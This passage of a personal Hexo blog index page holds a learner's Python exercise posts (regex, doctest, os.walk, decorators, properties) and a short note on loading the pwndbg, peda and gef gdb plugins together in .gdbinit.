class="keyword">done</span></span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/01/27/python/python-5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/27/python/python-5/" itemprop="url">python-第五天学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-27T12:51:23+08:00">
                2019-01-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
                    <span itemprop="name">python基础</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="正则学习"><a href="#正则学习" class="headerlink" title="正则学习"></a>正则学习</h2><p><strong>练习题：请尝试写一个验证 Email 地址的正则表达式。版本一应该可以验证出类似的 Email：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.match(<span class="string">r'^([0-9a-zA-Z\_\.]+)@([0-9a-zA-Z\_]+).([a-zA-Z]+)'</span>,<span class="string">'bill.gates@microsoft.com'</span>).groups()</span><br></pre></td></tr></table></figure>

<p><strong>版本二可以验证并提取出带名字的 Email 地址：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.match(<span class="string">r'^(&lt;[a-zA-Z\s]+&gt;)\s([0-9a-zA-Z\_\.\&lt;\&gt;]+)@([0-9a-zA-Z\_]+).([a-zA-Z]+)'</span>,<span class="string">'&lt;Tom Paris&gt; tom@voyager.org'</span>).groups()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/01/27/re/gdb-config/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/27/re/gdb-config/" itemprop="url">gdb_config</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-27T12:43:21+08:00">
                2019-01-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/gdb%E9%85%8D%E7%BD%AE/" itemprop="url" rel="index">
                    <span itemprop="name">gdb配置</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>在不久前，我很讨厌gdb这种调试器，在windows下熟悉了ollydbg的我，遇上了纯命令的gdb调试器很是费劲，所以我前段时间研究了下gdb的插件peda，pwndbg(专用于pwn)，gef这些个插件，网上你可以去找教程，那些教程都是说如何切换三个调试器，而我的重点是 <strong>三个插件如何一起使用</strong></p>
<h1 id="如何同时使用gef-pwndbg-peda三个插件？"><a href="#如何同时使用gef-pwndbg-peda三个插件？" class="headerlink" title="如何同时使用gef,pwndbg,peda三个插件？"></a>如何同时使用gef,pwndbg,peda三个插件？</h1><p>我研究了一番gdbinit的这份文件，有人说，这不就是几个source吗，有什么好研究的？确实如此，gdbinit里就是几个环境变量的配置，然而用不用的好就是另一回事了，经过我一番推敲，发觉这份配置是不会出错的配置，可以同时使用三个插件，下面先贴上gdbinit部分配置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.pwndbg/gdbinit.py</span><br><span class="line"><span class="built_in">source</span> ~/.peda/peda.py</span><br><span class="line"><span class="built_in">source</span> ~/.gdbinit-gef.py</span><br></pre></td></tr></table></figure>
<p>这个顺序不要调换，调换后会报错，具体pwndbg和peda和gef的安装，我就不教了，如果这个都不会，你装三个插件折腾个啥，一个插件就够你用了，有人看不懂这几句话，我也没办法，你照着改就好了。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/01/25/python/python-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/25/python/python-4/" itemprop="url">python-第四天学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-25T19:57:43+08:00">
                2019-01-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
                    <span itemprop="name">python基础</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="模块测试"><a href="#模块测试" class="headerlink" title="模块测试"></a>模块测试</h2><p>这部分没有例子，我也就没去写了，总的来说可以测试数据的合理性，没有通过模块测试一定有bug，不过你模块测试都写错了，那就没得说了</p>
<h2 id="文档测试"><a href="#文档测试" class="headerlink" title="文档测试"></a>文档测试</h2><p>练习：对函数 fact(n)编写 doctest 并执行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fact</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">----</span></span><br><span class="line"><span class="string">----</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError()</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n * fact(n - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> doctest</span><br><span class="line">    doctest.testmod()</span><br></pre></td></tr></table></figure>
<ul>
<li>上述为题目简介</li>
</ul>
<p>贴上代码，简单：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fact</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(1)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(2)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(3)</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; fact(4)</span></span><br><span class="line"><span class="string">    24</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError()</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n * fact(n<span class="number">-1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>文档测试可以用来做实例，还可以测试数据的正确性，不过不要跟我一样写有规律的测试，写一些随机取数测试</li>
</ul>
<h2 id="os输入输出流部分"><a href="#os输入输出流部分" class="headerlink" title="os输入输出流部分"></a>os输入输出流部分</h2><p>感觉跟c的读写文件都差不多，附上练习部分解答</p>
<ol>
<li>利用 os 模块编写一个能实现 dir -l 输出的程序**</li>
</ol>
<ul>
<li>dir -1就是将每个文件包括目录按每行一个列出来，不包括隐藏文件<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(<span class="string">'.'</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> f.startswith(<span class="string">'.'</span>):</span><br><span class="line">            <span class="keyword">print</span> f</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>编写一个程序，能在当前目录以及当前目录的所有子目录下查找文件名包含指定字符串的文件，并打印出相对路径。</li>
</ol>
<ul>
<li>这题也不难，说实话一开头还不会写，找了点参考文章后才会写</li>
</ul>
<p><strong>参考文章内容：</strong></p>
<ul>
<li><p>os.walk(path)遍历path，返回一个对象，</p>
</li>
<li><p>他的每个部分都是一个三元组(‘目录x’，[目录x下的目录list]，目录x下面的文件)</p>
</li>
<li><p>eg:for root ,dirs,files in os.walk(path):  #os.walk返回的是一个三元组:根目录,文件列表，文件名</p>
</li>
<li><p>举例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = os.walk(<span class="string">'.'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">输出：</span><br><span class="line">(<span class="string">'.'</span>, [<span class="string">'abc'</span>, <span class="string">'temp'</span>], [<span class="string">'path0704.py'</span>, <span class="string">'\xc2\xb7\xbe\xb6\xcf\xe0\xb9\xd8\xd1\xa7\xcf\xb0.txt'</span>])</span><br><span class="line">(<span class="string">'.\\abc'</span>, [], [<span class="string">'\xd0\xc2\xbd\xa8 BMP \xcd\xbc\xcf\xf1.bmp'</span>])</span><br><span class="line">(<span class="string">'.\\temp'</span>, [<span class="string">'temp1'</span>], [<span class="string">'temp.h'</span>])</span><br><span class="line">(<span class="string">'.\\temp\\temp1'</span>, [], [<span class="string">'abc.bmp'</span>])</span><br></pre></td></tr></table></figure></li>
<li><p><strong>下面贴上我的代码</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Findfile</span><span class="params">(name)</span>:</span></span><br><span class="line">    myos = os.walk(<span class="string">'.'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> myos:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[<span class="number">2</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> == j.find(name):</span><br><span class="line">                <span class="keyword">print</span> i[<span class="number">0</span>] + j</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    Findfile(<span class="string">'1.py'</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/01/24/python/python-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/24/python/python-3/" itemprop="url">python-第三天学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-24T19:57:43+08:00">
                2019-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
                    <span itemprop="name">python基础</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>装饰器原来感觉不好理解，这不就是函数嘛，为啥叫装饰器，在知乎上看到的解释还蛮不错的，就是原来有个东西，只有基础的部件，通过添加一些新东西过后，他就变成一个高级的部件</p>
<p><strong>题目练习：请编写一个 decorator，能在函数调用的前后打印出’begin call’和’end call’的日志</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @functools.wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kw)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"call start"</span></span><br><span class="line">        func(*args,**kw)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"call end"</span></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure>

<p><strong>思考题：再思考一下能否写出一个@log的decorator，使它既支持：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@log</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">又支持：</span><br><span class="line"><span class="meta">@log('execute')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>经过测试，是不可以的，先贴上我的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(text = <span class="string">'execute'</span>)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">        @functools.wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kw)</span>:</span></span><br><span class="line">            func(*args,**kw)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"><span class="meta">@log('execute')</span></span><br><span class="line"><span class="comment">#@log</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"a+b is :&#123;&#125;,&#123;&#125;"</span>.format(a+b,a-b)</span><br><span class="line"></span><br><span class="line">now(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p><strong><big>理由如下：</big></strong></p>
<p>我以为利用默认参数可以，可报错出现了，显示的是<strong>decorator take exactly 1 arguements(2 given)</strong> 仔细分析一下可以知道@log(‘execute’)是执行完最外层的return了，到了decorator这层，这次就是now = decorator(now),而如果我用@log的话，就是now = log(now),这样明显会出错，无法将函数传到第二层的装饰器部分，即使有默认参数，他也只将now当作你传入的参数，也就是text进行执行，然后这样执行下来的结果就变成decorator(1,2)错误的做法</p>
<p><strong>练习题：请利用@property 给一个 Screen 对象加上width和height属性，以及一个只读属性 resolution</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Screen</span><span class="params">(object)</span>:</span></span><br><span class="line">----</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">----</span><br><span class="line"><span class="comment"># test:</span></span><br><span class="line">s = Screen()</span><br><span class="line">s.width = <span class="number">1024</span></span><br><span class="line">s.height = <span class="number">768</span></span><br><span class="line">print(s.resolution)</span><br><span class="line"><span class="keyword">assert</span> s.resolution == <span class="number">786432</span>, <span class="string">'1024 * 768 = %d ?'</span> % s.resolution</span><br></pre></td></tr></table></figure>

<ul>
<li>类这大部分跟c的差别不大，唯一的区别就是可以动态绑定属性和函数</li>
<li>这道题不难，很简单，就是方法的使用，无技巧性的东西</li>
<li>贴上我的代码</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Screen</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">width</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._width</span><br><span class="line"><span class="meta">    @width.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">width</span><span class="params">(self,value)</span>:</span></span><br><span class="line">        self._birth = value</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">height</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._height</span><br><span class="line"><span class="meta">    @height.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">height</span><span class="params">(self,value)</span>:</span></span><br><span class="line">        self._height = value</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">resolution</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._birth * self._height</span><br><span class="line"></span><br><span class="line">s = Screen()</span><br><span class="line">s.width = <span class="number">1024</span></span><br><span class="line">s.height = <span class="number">768</span></span><br><span class="line"><span class="keyword">print</span> (s.resolution)</span><br><span class="line"><span class="keyword">assert</span> s.resolution == <span class="number">786432</span>, <span class="string">'1024 * 768 = &#123;&#125;'</span>.format(s.resolution)</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/">&lt;i class=&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/">&lt;i class=&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">LiHua</p>
              <p class="site-description motion-element" itemprop="description">One people that no one know</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">62</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">LiHua</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
